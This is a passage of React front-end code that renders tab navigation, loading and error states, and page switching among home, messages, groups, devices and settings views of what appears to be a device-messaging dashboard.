            const active = page === key;
            return (
              <button key={key} onClick={() => { setPage(key); setSelectedDevice(null); setScrollToMsgId(null); }} style={{
                flex: 1, padding: "10px 2px", border: "none", background: "none",
                cursor: "pointer", fontSize: 14,
                fontWeight: active ? 700 : 400,
                color: active ? "#2563eb" : "#64748b",
                borderBottom: active ? "2px solid #2563eb" : "2px solid transparent",
                marginBottom: -2,
              }}>
                {label}
              </button>
            );
          })}
        </div>
        </div>{/* end sticky outer wrapper */}

        {/* Content */}
        {loading && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <CircularLoader size={56} label="Loading data…" color="#6366f1" labelColor="#94a3b8" />
          </div>
        )}
        {!loading && error && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <div style={{ fontSize: 13, color: "#ef4444", fontWeight: 600 }}>Error: {error}</div>
            <div style={{ fontSize: 11, color: "#94a3b8" }}>Check that the API server is running.</div>
          </div>
        )}
        {!loading && !error && (
          <>
            <div id="main-scroll" style={{ flex: 1, overflowY: "auto", minHeight: 0, overscrollBehavior: "contain" }}>
              {page === "home" && <HomePage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} />}
              {page === "messages" && <MessagesPage messages={messages} devices={displayDevices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
              {page === "groups" && <GroupsPage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} />}
              {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
              {page === "settings" && <SettingsPage appId={appId} isDark={darkMode} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} />}
            </div>
            <ScrollToTopBtn />
          </>
        )}
      </div>
    </div>
    </ThemeCtx.Provider>
  );
}
